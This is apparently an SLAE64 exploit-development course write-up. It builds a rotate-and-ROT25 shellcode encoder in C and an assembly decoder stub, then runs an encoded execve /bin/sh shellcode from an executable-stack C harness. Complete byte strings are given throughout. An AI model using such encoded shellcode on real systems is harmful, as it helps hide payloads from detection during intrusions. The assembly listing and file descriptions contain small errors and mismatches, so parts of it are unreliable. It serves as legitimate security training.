## Create Encoding Scheme
---
---
### Introduction
---
This assignment consist on creating a Custom Encoder like the Insertion Encoder, and create a PoC using the [Execve-Stack](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Execve-Stack.nasm) as the shellcode. 
Once this is done, a decoder stub has to be implemented in ASM to decode our shellcode and run it. The encoder will be done using C language.

### Encoder Schema
---
The Encoder requires a working shellcode as input. This shellcode, will be encoded with the schema, and the results will be printed in hexadecimal for use as desireed. 

The encoder will do the following: 
- Rotate each byte of the shellcode 3 bits to left 
- Do a **ROT25** on each byte of the shellcode 

#### Left Shift Byte Bits
First to do in the Encoder, is to shift 3 bites to left on each byte of the original shellcode:

- Get a byte from the shellcode string
- Shift the bits three positions to left
- If the most significant bit is "1" it should rotate to the less significant bit

This is implemented in the following way:
```c
shifted_byte = ( original_byte << SHIFTS ) | ( original_byte >> ( BITS_TO_ROTATE - SHIFTS ))
```
Where:
- **SHIFTS** is how many shifts to do. It our case, is "3" shifts to left
- **BITS_TO_ROTATE** indicates how many bits are implied in the rotation. As we are working with bytes, it's value is "8" bits.

#### ROT25
Once the original shellcode has been Left Shifted, it's time to **ROT25** it. As we work with bytes it's values can go from `0x00` to `0xFF`
- Each byte of the shellcode will get a new value that’s the actual value + 25
- In the case of the last 25 possible values for a byte, we will start from `0x00`. 

This table will show the idea:
```markdown
  --------------------------------------------------------------------------------
  |  Original Value    0x00   0x01   ...   0x80   ...   0xe7   0xe8   ...   0xff |
  |  Decimal Value        0      1   ...    128   ...    231    232   ...    255 |
  |  ROT25 Value       0x19   0x1a   ...   0x99   ...   0x00   0x01   ...   0x18 |
  --------------------------------------------------------------------------------
```
This will be implemented for each byte in this way:
```c
rot_max_value = 256 – 25		                         ; 231 (0xe7) 
if (original_value < rot_max_value) then 
   rot25_value = original_value + 25 
else				                                         ; Here the value will be 231 or greater 
   rot25_value = (original_value + rot) – 256        ; It's rotated from the start
end if 
```
### Encoder Implementation
---
The encode will be implemented in C language. 

- A string is defined to store the original shellcode. This is the string to encode. From the [Execve-Stack](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Execve-Stack.nasm): 
```c
unsigned char code[]= \ 
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50
 \x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"; 
```
- For each byte of the original shellcode, it's bites are shifted "3" positions to left:
  - A bucle iterates each byte of the string, and for each byte
  - Each byte is shifted to right as been explained in the previous sections
  - The shifted byte value is printed on stdout
```c
        // 3 bits left Rotation 
        for (int i = 0; i< strlen(code); i++) { 
            code[i] = (code[i] << SHIFTS) | ( code[i] >> (BITS_TO_ROTATE - SHIFTS)); 
            printf("0x%02x,", code[i]); 
        }	 
```
- Once shellcode been shifted, a **ROT25** is applied:
  - If the byte value is lower than "231", simply adds 25 to the byte value
  - If the byte value is greater or equal to "231", adds 25 to it's value for substracting 256 of it
  - Prints each byte one ROT'ed on screen
```c
        // ROTX the ShellCode 
        unsigned char rot = 25; 
        unsigned char max_rot = 256 - rot; 

        for (int i = 0; i < strlen(code); i++) { 
                if (code[i] < max_rot) {                     ; value < "231"
                        code[i] = code[i] + rot;             ; Add 25
                        printf("0x%02x,",code[i]); 
                } else {                                     ; value >= "31"
                        code[i] = (code[i] + rot) - 256;     ; value = original_value + rot - 256
                        printf("0x%02x,",code[i]); 
                } 
        } 
```

After this all, the Encoded shellcode will be printed in screen. This is the shellcode that needs to go into the ASM Decoder Stub to be decoded and executed. The following info for later use is printed on screen:
- Legth of the shellcode
- The original shellcode string in hex 
- The string in hex of the left rotated shellcode 
- The string in hex of **ROT25** of the already rotated shellcode 

The Encoder code can be found on [GitHub Repo](https://github.com/galminyana/SLAE64/blob/main/Assignment04/) for this assignment, in the [Encoder.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Encoder.c) file:

```c
#include <stdio.h>
#include <string.h>

#define BITS_TO_ROTATE	8
#define SHIFTS 		      3

unsigned char code[]= \
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48"
"\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

void main (void)
{
	printf("\nShellCode Length: %d\n", strlen(code)); 
	printf("\nOriginal ShellCode:\n");

	for (int i = 0; i < strlen(code); i++) {
		printf("0x%02x,", code[i]);
	}

	printf("\n\nShifted Left 3 bits ShellCode:\n");

	// 3 bits left Rotation
	for (int i = 0; i< strlen(code); i++) {
		code[i] = (code[i] << SHIFTS) | ( code[i] >> (BITS_TO_ROTATE - SHIFTS));
		printf("0x%02x,", code[i]);
	}

	printf("\n\nROT25 ShellCode:\n");

	// ROTX the ShellCode
	unsigned char rot = 25;
	unsigned char max_rot = 256 - rot;

	for (int i = 0; i < strlen(code); i++) {
		if (code[i] < max_rot) {
			code[i] = code[i] + rot;
			printf("0x%02x,",code[i]);
		} else {
			code[i] = (code[i] + rot) - 256;
			printf("0x%02x,",code[i]);
		}
	}
	printf("\n");
}	
```
### Encoder: Compile and Run
---
Time to compile the source:
```bash
SLAE64> gcc Encoder.c -o Encoder
```
And execute it:
```bash
SLAE64> ./Encoder 

ShellCode Length: 32

Original ShellCode:
0x48,0x31,0xc0,0x50,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0x48,0x83,0xc0,0x3b,0x0f,0x05,

Shifted Left 3 bits ShellCode:
0x42,0x89,0x06,0x82,0x42,0xdd,0x79,0x13,0x4b,0x73,0x79,0x79,0x9b,0x43,0x9a,0x42,0x4c,0x3f,0x82,0x42,0x4c,0x17,0xba,0x42,0x4c,0x37,0x42,0x1c,0x06,0xd9,0x78,0x28,

ROT25 ShellCode:
0x5b,0xa2,0x1f,0x9b,0x5b,0xf6,0x92,0x2c,0x64,0x8c,0x92,0x92,0xb4,0x5c,0xb3,0x5b,0x65,0x58,0x9b,0x5b,0x65,0x30,0xd3,0x5b,0x65,0x50,0x5b,0x35,0x1f,0xf2,0x91,0x41,

SLAE64> 
```
<img src="https://galminyana.github.io/img/A04_Encoder_Compile.png" width="75%" height="75%">

The result, as expected, is the original shellcode and both steps of the encoder results being shown in ASM format to use in the Decoder Stub. The end shellcode is the **ROT25** Shellcode.

### Decoder Implementation
---
The decoder stub will be done in ASM. It gets the encoded string generated with the Encoder.
The ASM file is well commented in the code. What the code does to decode is: but mainly what it has to do is:
- Decode the **ROT25** encoded string:
  - If encoded value is greater or equal to 25, we substract 25 to the byte value
  - If encoded value is lower, then we add 231 to the byte value
-Rotate right 3 bits each byte of the encoded string. For that, we will use the ROR instruction

The encoded shellcode needs to be stored as a string (`db`) in the ASM. For this reason, `jmp-call-pop` technique will be used to reference to it.

In the code, two values are defined:
- **ROT**: The ROT value to do. In this case, "25" for **ROT25**
- **SHELLCODE_LENGTH**: The length of the shellcode. This value is given by the Encoder.c code, "32" for the original shellcode used

The program goes decoding the string over itself, and once it has been completelly decoded, jumps to the first instruction to execute the original shellcode. This instruction will be the first byte of the defined string.

The ASM code can be found on file [Decode-Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Decode-Execve-Stack.nasm) at the Assignment [GitHub Repo](https://github.com/galminyana/SLAE64/blob/main/Assignment04/):

```asm
global _start 

%define ROT			25
%define SHELLCODE_LENGTH	32

section .text
_start:

	jmp short jmp_shellcode		; JMP-CALL-POP

jmp_real_start:

	pop rsi				; RSI stores @ of the shellcode (jmp-call-pop)

	push rsi			; Backup of RSI for later use
	pop rbx

; Decode the ROT25 from coded shellcode
;    (a)If shellcode[i] >= ROT, substract ROT to shellcode[i]
;    (b)If shellcode[i] < ROT: Add 256 - ROT. 
jmp_rot25:
	
	push SHELLCODE_LENGTH		; RCX <- shellcode length to iterate throught each byte
	pop rcx

jmp_rot25_bucle:

	cmp  byte [rsi], ROT 		; Compare the value of the byte with the ROT
	jl jmp_rot25_2			; If less jump to do (b)
	sub byte [rsi], ROT		; Doing (a). Substract ROT to encoded shellcode byte 
	jmp short jmp_rot25_end_bucle


jmp_rot25_2:
	
	add byte [rsi], 256-ROT		; Code for (b) operation 

jmp_rot25_end_bucle:

	inc rsi				; Next byte of the shellcode
	; Check if all bytes of shellcode been ROT25'ed
	loop jmp_rot25_bucle		; Still bytes remaining, start bucle again
	loop jmp_rot25_bucle

; Cicle Rotate to Right shifting 3 bits 
;  ROT >> 3
jmp_rotate:

	push rbx			; Restore shellcode address to iterate again
	pop rsi	

	push SHELLCODE_LENGTH		; For the loop to iterate each byte of shellcode
	pop rcx

jmp_rotate_bucle:

	ror byte [rsi], 3		; Rotate right 3 bits
	
	inc rsi				; Next byte of the shellcode
	loop jmp_rotate_bucle		

jmp_execute_shellcode:

	jmp rbx				; Jump to execute the original shellcode

jmp_shellcode:	

	call jmp_real_start
	shellcode: db 0x5b,0xa2,0x1f,0x9b,0x5b,0xf6,0x92,0x2c,0x64,0x8c,0x92,0x92,0xb4,0x5c,
	           0xb3,0x5b,0x65,0x58,0x9b,0x5b,0x65,0x30,0xd3,0x5b,0x65,0x50,0x5b,0x35,
		   0x1f,0xf2,0x91,0x41
```
### Decoder: Compile and Generate Shellcode
---
The Decoder.nasm file is compiled, and the shellcode is generated using `objdump` one line command:
```bash
SLAE64> nasm -f elf64 Decode-Execve-Stack.nasm -o Decode-Execve-Stack.o
SLAE64> echo “\"$(objdump -d Decode-Execve-Stack.o | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""

"\xeb\x27\x5e\x56\x5b\x6a\x20\x59\x80\x3e\x19\x7c\x05\x80\x2e\x19\xeb\x03\x80\x06\xe7\x48\xff\xc6\xe2\xee\x53\x5e\x6a\x20\x59\xc0\x0e\x03\x48\xff\xc6\xe2\xf8\xff\xe3\xe8\xd4\xff\xff\xff\x5b\xa2\x1f\x9b\x5b\xf6\x92\x2c\x64\x8c\x92\x92\xb4\x5c\xb3\x5b\x65\x58\x9b\x5b\x65\x30\xd3\x5b\x65\x50\x5b\x35\x1f\xf2\x91\x41"

SLAE64> 
```
<img src="https://galminyana.github.io/img/A04_Decoder_Compile.png" width="75%" height="75%">

### Testing the Decoder Stub
---
Using the `shellcode.c` template, the generated shellcode needs to be executed and for that, it's placed into the `code[]` string on the file. This file can be found on the [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/shellcode.c) at the Assignment [GitHub Repo](https://github.com/galminyana/SLAE64/blob/main/Assignment04/):
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\xeb\x27\x5e\x56\x5b\x6a\x20\x59\x80\x3e\x19\x7c\x05\x80\x2e\x19"
"\xeb\x03\x80\x06\xe7\x48\xff\xc6\xe2\xee\x53\x5e\x6a\x20\x59\xc0"
"\x0e\x03\x48\xff\xc6\xe2\xf8\xff\xe3\xe8\xd4\xff\xff\xff\x5b\xa2"
"\x1f\x9b\x5b\xf6\x92\x2c\x64\x8c\x92\x92\xb4\x5c\xb3\x5b\x65\x58"
"\x9b\x5b\x65\x30\xd3\x5b\x65\x50\x5b\x35\x1f\xf2\x91\x41";

void main()
{
	printf("ShellCode Lenght: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```
Now it can be compiled with `gcc`:
```bash
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```
The resulting file is the one to execute, that doing it, the result is the expected:
<img src="https://galminyana.github.io/img/A04_Results_01.png" width="75%" height="75%">

### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment04) for this assignment contains the following files:

- [Encoder.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Encoder.c) : This C file is the implementation of the Encoder Scheme. Prints out a encoded shellcode.
- [Decode-Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Decode-Execve-Stack.nasm) : This is the NULL free code for the Egg Hunter.
- [Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment4/ReverseShell-ExecveStack_V2.nasm) : This is the code for the shellcode to use in the PoC.
- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/shellcode.c) : The C template with the [Decode-Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Decode-Execve-Stack.nasm), ready to compile and execute


